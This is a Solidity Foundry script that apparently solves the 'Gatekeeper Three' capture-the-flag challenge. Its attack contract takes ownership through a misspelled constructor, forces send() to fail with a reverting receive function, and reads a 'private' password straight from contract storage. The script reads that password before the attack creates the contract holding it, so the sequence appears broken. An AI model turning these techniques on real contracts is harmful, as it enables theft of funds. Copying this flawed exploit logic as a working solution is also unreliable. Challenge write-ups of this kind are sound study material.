// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Script.sol";

interface IGatekeeperThree {
    function construct0r() external;
    function createTrick() external;
    function getAllowance(uint256 password) external;
    function enter() external;
}

contract Attack {

    IGatekeeperThree target;

    constructor(address _target) {
        target = IGatekeeperThree(_target);
    }

    function attack(uint256 password) external payable {
        // become owner
        target.construct0r();

        // create trick
        target.createTrick();

        // allow entrance
        target.getAllowance(password);

        // enter
        target.enter();
    }

    receive() external payable {
        revert(); // force send() to fail
    }
}

contract GatekeeperThreeSolution is Script {

    function run() external {
        address target = 0xYOUR_INSTANCE;

        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        // read password from storage slot (slot 2 in trick contract)
        address trick = address(
            uint160(uint256(vm.load(target, bytes32(uint256(2)))))
        );

        bytes32 password = vm.load(trick, bytes32(uint256(2)));

        Attack attacker = new Attack(target);

        // send ETH to target
        payable(target).call{value: 0.002 ether}("");

        attacker.attack{value: 0}(uint256(password));

        vm.stopBroadcast();
    }
}